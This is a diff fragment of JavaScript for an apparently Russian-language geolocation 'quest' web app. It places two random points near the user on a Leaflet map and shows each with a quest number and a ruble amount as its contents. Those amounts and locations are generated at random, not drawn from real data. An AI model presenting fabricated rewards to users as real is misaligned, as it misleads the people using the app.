+            panel.style.transition = 'transform 0.3s ease';
+            const delta = currentY - startY;
+            if (delta > 80) closeQuestPanel();
+            else panel.style.transform = 'translateY(0)';
+        }, { passive: true });
+
+        panel.addEventListener('touchstart', function(e) {
+            if (isInteractiveElement(e.target)) return;
+            startY = e.touches[0].clientY;
+            isDragging = true;
+            panel.style.transition = 'none';
+        }, { passive: true });
+
+        panel.addEventListener('touchmove', function(e) {
+            if (!isDragging) return;
+            currentY = e.touches[0].clientY;
+            const delta = currentY - startY;
+            if (delta > 0) panel.style.transform = `translateY(${delta}px)`;
+        }, { passive: true });
+
+        panel.addEventListener('touchend', function(e) {
+            if (!isDragging) return;
+            isDragging = false;
+            panel.style.transition = 'transform 0.3s ease';
+            const delta = currentY - startY;
+            if (delta > 80) closeQuestPanel();
+            else panel.style.transform = 'translateY(0)';
+        }, { passive: true });
+
+        function toRad(deg) { return deg * Math.PI / 180; }
+        function toDeg(rad) { return rad * 180 / Math.PI; }
+
+        function getRandomPoint(lat, lng, minDist, maxDist) {
+            const R = 6371;
+            const dist = minDist + Math.random() * (maxDist - minDist);
+            const bearing = Math.random() * 2 * Math.PI;
+            const lat1 = toRad(lat);
+            const lng1 = toRad(lng);
+            const lat2 = Math.asin(
+                Math.sin(lat1) * Math.cos(dist / R) +
+                Math.cos(lat1) * Math.sin(dist / R) * Math.cos(bearing)
+            );
+            const lng2 = lng1 + Math.atan2(
+                Math.sin(bearing) * Math.sin(dist / R) * Math.cos(lat1),
+                Math.cos(dist / R) - Math.sin(lat1) * Math.sin(lat2)
+            );
+            return { lat: toDeg(lat2), lng: toDeg(lng2) };
+        }
+
+        function haversine(lat1, lng1, lat2, lng2) {
+            const R = 6371;
+            const dLat = toRad(lat2 - lat1);
+            const dLng = toRad(lng2 - lng1);
+            const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLng/2)**2;
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return R * c;
+        }
+
+        function formatCoords(lat, lng) {
+            return `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+        }
+
+        function formatDistance(km) {
+            if (km < 1) return `${(km * 1000).toFixed(0)} м`;
+            return `${km.toFixed(1)} км`;
+        }
+
+        function generateQuestData(lat, lng) {
+            const saved = localStorage.getItem('questData');
+            if (saved) return JSON.parse(saved);
+
+            const points = [];
+            for (let i = 0; i < 2; i++) {
+                const point = getRandomPoint(lat, lng, MIN_RANDOM_KM, MAX_RANDOM_KM);
+                const dist = haversine(lat, lng, point.lat, point.lng);
+                points.push({
+                    lat: point.lat,
+                    lng: point.lng,
+                    distance: dist,
+                    photo: PHOTOS[i],
+                    questId: Math.floor(4000 + Math.random() * 2000),
+                    reward: REWARDS[Math.floor(Math.random() * REWARDS.length)]
+                });
+            }
+
+            const data = { userLat: lat, userLng: lng, points: points, created: Date.now() };
+            localStorage.setItem('questData', JSON.stringify(data));
+            return data;
+        }
+
+        function showQuestPanel(index) {
+            currentPointIndex = index;
+            const point = questData.points[index];
+
+            document.getElementById('questTitle').textContent = `Квест #${point.questId}`;
+            document.getElementById('questReward').textContent = `Содержимое: ${point.reward.toLocaleString('ru-RU')} ₽`;
+            document.getElementById('questCoords').textContent = formatCoords(point.lat, point.lng);
+            document.getElementById('questDistance').textContent = formatDistance(point.distance);
+            document.getElementById('questImg').src = point.photo;
+
+            updateLockOverlay();
+
+            panel.classList.add('active');
+            panel.style.transform = 'translateY(0)';
+        }
+
+        function closeQuestPanel() {
+            panel.classList.remove('active');
+            panel.style.transform = 'translateY(100%)';
+        }
+
+        function focusLocation() {
+            if (userPos) map.setView([userPos.lat, userPos.lng], 14);
+        }
+
+        function initMap(lat, lng) {
+            userPos = { lat, lng };
+            map = L.map('map', { zoomControl: false, attributionControl: false }).setView([lat, lng], 14);
+
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                maxZoom: 19,
+                attribution: '&copy; OpenStreetMap'
+            }).addTo(map);
+
+            questData = generateQuestData(lat, lng);
+
+            const userIcon = L.divIcon({
+                className: 'user-marker',
+                html: '<div style="width:20px;height:20px;background:#3498db;border:3px solid white;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,0.3);"></div>',
+                iconSize: [20, 20],
+                iconAnchor: [10, 10]
+            });
+            userMarker = L.marker([lat, lng], { icon: userIcon }).addTo(map);
+            userMarker.bindPopup('<b>📍 Вы здесь</b><br>' + formatCoords(lat, lng)).openPopup();
+
+            const randomIcon = L.divIcon({
+                className: 'random-marker',
+                html: '<div style="width:24px;height:24px;background:#e74c3c;border:3px solid white;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,0.3);display:flex;align-items:center;justify-content:center;color:white;font-size:12px;font-weight:bold;">?</div>',
+                iconSize: [24, 24],
+                iconAnchor: [12, 12]
+            });
+
+            questData.points.forEach((point, index) => {
+                const marker = L.marker([point.lat, point.lng], { icon: randomIcon }).addTo(map);
+                marker.on('click', () => {
+                    closeQuestPanel();
+                    setTimeout(() => showQuestPanel(index), 50);
+                });
+                randomMarkers.push(marker);
+            });
+
+            const bounds = L.latLng(lat, lng).toBounds(RADIUS_KM * 2000);
+            map.setMaxBounds(bounds);
+            map.options.minZoom = 12;
+            map.on('click', closeQuestPanel);
+        }
+
+        function initLocation() {
+            document.getElementById('loading').classList.remove('hidden');
+            document.getElementById('error').classList.remove('active');
+
+            if (!navigator.geolocation) {
+                showError('Геолокация не поддерживается вашим устройством');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    document.getElementById('loading').classList.add('hidden');
+                    initMap(position.coords.latitude, position.coords.longitude);
+                    handleStartAppParam();
+                },
+                (error) => {
+                    let msg = 'Не удалось определить местоположение';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            msg = 'Доступ к геолокации запрещён. Пожалуйста, разрешите доступ в настройках браузера.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            msg = 'Информация о местоположении недоступна.';
+                            break;
+                        case error.TIMEOUT:
+                            msg = 'Время ожидания геолокации истекло.';
+                            break;
+                    }
+                    showError(msg);
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        function showError(msg) {
+            document.getElementById('loading').classList.add('hidden');
+            document.getElementById('errorText').textContent = msg;
+            document.getElementById('error').classList.add('active');
+        }
+
+        initLocation();
+    </script>
+</body>
+</html>
